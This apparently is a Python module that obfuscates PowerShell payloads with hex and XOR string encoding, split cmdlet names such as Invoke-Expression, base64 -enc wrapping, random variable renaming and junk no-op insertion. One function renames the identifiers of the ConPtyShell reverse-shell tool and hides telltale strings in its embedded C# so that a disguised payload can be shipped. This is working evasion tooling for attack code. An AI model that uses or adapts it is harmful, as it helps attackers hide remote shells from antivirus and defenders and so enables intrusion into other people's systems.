from __future__ import annotations

import base64
import random
import re
import string

def _to_ps_hex_str(s: str) -> str:
    hex_bytes = ",".join(f"0x{b:02X}" for b in s.encode())
    return f"([System.Text.Encoding]::UTF8.GetString([byte[]]({hex_bytes})))"


def ps_hex_obfuscate(payload: str) -> str:
    return re.sub(r"'([^']*)'", lambda m: _to_ps_hex_str(m.group(1)), payload)


def _split_parts(s: str) -> list[str]:
    n = random.randint(2, min(4, len(s)))
    indices = sorted(random.sample(range(1, len(s)), n - 1))
    parts, prev = [], 0
    for idx in indices:
        parts.append(s[prev:idx])
        prev = idx
    parts.append(s[prev:])
    return parts


def _random_split(cmdlet: str) -> str:
    parts = _split_parts(cmdlet)
    q = random.choice(('"', "'"))
    return "&(" + "+".join(f"{q}{p}{q}" for p in parts) + ")"


_PS_CMDLETS = [
    "Invoke-Expression",
    "New-Object",
    "Out-String",
    "Get-Content",
    "Write-Host",
    "Get-Item",
    "Test-Path",
    "iex",
    "pwd",
]


def ps_syntax_obfuscate(payload: str) -> str:
    result = payload
    for cmdlet in _PS_CMDLETS:
        result = re.sub(
            rf'(?<![.\w]){re.escape(cmdlet)}(?![\w])',
            lambda _, c=cmdlet: _random_split(c),
            result,
        )
    return result


def _format_split(s: str) -> str:
    if len(s) < 2:
        return f"'{s}'"
    n = random.randint(2, min(3, len(s)))
    indices = sorted(random.sample(range(1, len(s)), n - 1))
    parts, prev = [], 0
    for idx in indices:
        parts.append(s[prev:idx])
        prev = idx
    parts.append(s[prev:])
    placeholders = "".join(f"{{{i}}}" for i in range(n))
    parts_str = ",".join(f"'{p}'" for p in parts)
    return f"('{placeholders}' -f {parts_str})"


def ps_format_obfuscate(payload: str) -> str:
    return re.sub(
        r"'([^']{2,})'",
        lambda m: _format_split(m.group(1)),
        payload,
    )


def _xor_encode_str(s: str) -> str:
    key = random.randint(1, 255)
    var = f"k{random.randint(1000, 9999)}"
    bvar = f"b{random.randint(1000, 9999)}"
    hex_bytes = ",".join(f"0x{(ord(c) ^ key):02x}" for c in s)
    return f"$(${var}={key};${bvar}=[byte[]]({hex_bytes});-join(${bvar}|%{{[char]($_-bxor${var})}}))"


def ps_xor_obfuscate(payload: str) -> str:
    return re.sub(
        r"'([^']{2,})'",
        lambda m: _xor_encode_str(m.group(1)),
        payload,
    )


def _rand_ident(length: int = 10) -> str:
    first = random.choice(string.ascii_letters)
    rest = random.choices(string.ascii_letters + string.digits, k=length - 1)
    return first + "".join(rest)


def _cs_char_array(value: str) -> str:
    """C# expression equal to a string literal, but leaving none in the MSIL."""
    chars = ",".join(f"(char){ord(c)}" for c in value)
    return f"new string(new char[]{{{chars}}})"


_CS_SIGNAL_LITERALS: list[tuple[str, str]] = [
    ('"\\\\Device\\\\Afd"',   "\\Device\\Afd"),
    ('"CreatePseudoConsole"',  "CreatePseudoConsole"),
    ('"File"',                 "File"),
]

def ps_base64_encode(payload: str) -> str:
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
    return f"powershell -enc {b64}"


def obfuscate_conptyshell(ps1_data: bytes) -> tuple[bytes, str]:
    payload = ps1_data.decode("utf-8", errors="replace")

    # A no-op rename would ship the original identifiers or point invoke at a missing name.
    if "Invoke-ConPtyShell" not in payload:
        raise ValueError(
            "fetched ConPtyShell has no 'Invoke-ConPtyShell' entry point; "
            "upstream layout changed, refusing to ship an unobfuscated payload"
        )

    # Order matters: renames[0] is the entry point, renames[-1] the C# source var.
    renames: list[tuple[str, str]] = [
        ("Invoke-ConPtyShell",              "Invoke-" + _rand_ident(9)),
        ("ConPtyShellMainClass",            _rand_ident(12)),
        ("ConPtyShellException",            _rand_ident(10)),
        ("SpawnConPtyShell",                _rand_ident(11)),
        ("ConPtyShell",                     _rand_ident(11)),
        ("SocketHijacking",                 _rand_ident(12)),
        ("DeadlockCheckHelper",             _rand_ident(12)),
        ("ParentProcessUtilities",          _rand_ident(14)),
        ("NtQuerySystemInformationDynamic", _rand_ident(14)),
        ("NtQueryObjectDynamic",            _rand_ident(12)),
        ("QueryObjectTypesInfo",            _rand_ident(12)),
        ("GetTypeIndexByName",              _rand_ident(12)),
        ("DuplicateSocketsFromHandles",     _rand_ident(13)),
        ("FilterAndOrderSocketsByBytesIn",  _rand_ident(14)),
        ("GetSocketTcpInfo",                _rand_ident(11)),
        ("DuplicateSocketFromHandle",       _rand_ident(13)),
        ("GetSocketsTargetProcess",         _rand_ident(13)),
        ("IsSocketInherited",               _rand_ident(12)),
        ("IsSocketOverlapped",              _rand_ident(12)),
        ("DuplicateTargetProcessSocket",    _rand_ident(14)),
        ("SetSocketBlockingMode",           _rand_ident(12)),
        ("CheckDeadlockDetected",           _rand_ident(12)),
        ("ThreadCheckDeadlock",             _rand_ident(12)),
        ("GetParentProcess",                _rand_ident(11)),
        ("AlignUp",                         _rand_ident(8)),
        ("$Source",                         "$" + _rand_ident(8)),
    ]
    new_fn  = renames[0][1]
    new_src = renames[-1][1]

    for old, new in renames:
        payload = payload.replace(old, new)

    here_start = payload.find(f"{new_src} = @\"")
    if here_start == -1:
        here_start = payload.find('@"')
    cs_start = payload.find('\n', here_start) + 1 if here_start != -1 else len(payload)
    cs_end   = payload.rfind('"@')

    if cs_start < cs_end:
        cs_body = payload[cs_start:cs_end]
        for src_literal, value in _CS_SIGNAL_LITERALS:
            cs_body = cs_body.replace(src_literal, _cs_char_array(value))
        payload = payload[:cs_start] + cs_body + payload[cs_end:]

    ps_end  = payload.find(f"{new_src} = @\"")
    if ps_end == -1:
        ps_end = len(payload)
    ps_part = payload[:ps_end]
    ps_part = re.sub(r'\bAdd-Type\b', lambda _: _random_split("Add-Type"), ps_part)
    payload = ps_part + payload[ps_end:]

    return payload.encode("utf-8"), new_fn

_PS_RESERVED_VARS = frozenset({
    "$_", "$args", "$input", "$this", "$psitem", "$true", "$false", "$null",
    "$host", "$pwd", "$pid", "$home", "$error", "$foreach", "$switch",
    "$lastexitcode", "$matches", "$myinvocation", "$pscommandpath",
    "$psscriptroot", "$executioncontext", "$stacktrace", "$ofs", "$profile",
    "$shellid", "$pshome", "$nestedpromptlevel", "$consolefilename", "$event",
    "$eventargs", "$eventsubscriber", "$sender", "$allnodes", "$pscmdlet",
    "$psboundparameters", "$psculture", "$psuiculture", "$psversiontable",
    "$psdebugcontext", "$iscoreclr", "$islinux", "$ismacos", "$iswindows",
    "$env", "$global", "$script", "$local", "$private", "$using",
    "$variable", "$function", "$alias", "$workflow",
})

_PS_VAR_RE = re.compile(r'\$[a-zA-Z_][a-zA-Z0-9_]*')


def ps_variable_obfuscate(payload: str) -> str:
    """Full-token match so $a cannot mangle $ab; reserved vars are left alone."""
    mapping: dict[str, str] = {}

    def _repl(m: "re.Match[str]") -> str:
        name = m.group(0)
        key = name.lower()
        if key in _PS_RESERVED_VARS:
            return name
        if key not in mapping:
            mapping[key] = f"${_rand_ident(8)}"
        return mapping[key]

    return _PS_VAR_RE.sub(_repl, payload)


def ps_bullshit_obfuscate(payload: str) -> str:
    def generate_noise_chain():
        rands1 = ''.join(random.choices(string.ascii_letters, k=5))
        rands2 = ''.join(random.choices(string.ascii_letters, k=5))
        
        noops = [
            "&{}", 
            "$()", 
            f"${rands1}=$null",
            f"[void]${rands2}"
        ]
        
        chosen = random.sample(noops, k=random.randint(2, 4))
        return ";".join(chosen)

    output = []
    in_single_quote = False
    in_double_quote = False
    paren_depth = 0
    brace_depth = 0
    
    i = 0
    while i < len(payload):
        char = payload[i]
        
        if char == "'" and not in_double_quote:
            in_single_quote = not in_single_quote
        elif char == '"' and not in_single_quote:
            in_double_quote = not in_double_quote
            
        if not in_single_quote and not in_double_quote:
            if char == '(': paren_depth += 1
            elif char == ')': paren_depth -= 1
            elif char == '{': brace_depth += 1
            elif char == '}': brace_depth -= 1
        
        if char == ';' and not in_single_quote and not in_double_quote and paren_depth == 0:
            next_chars = payload[i+1:i+5].lstrip()
            if next_chars and not next_chars.startswith((';', '}', ')', '|')):
                output.append(f";{generate_noise_chain()};")
            else:
                output.append(char)
        else:
            output.append(char)
            
        i += 1

    return "".join(output)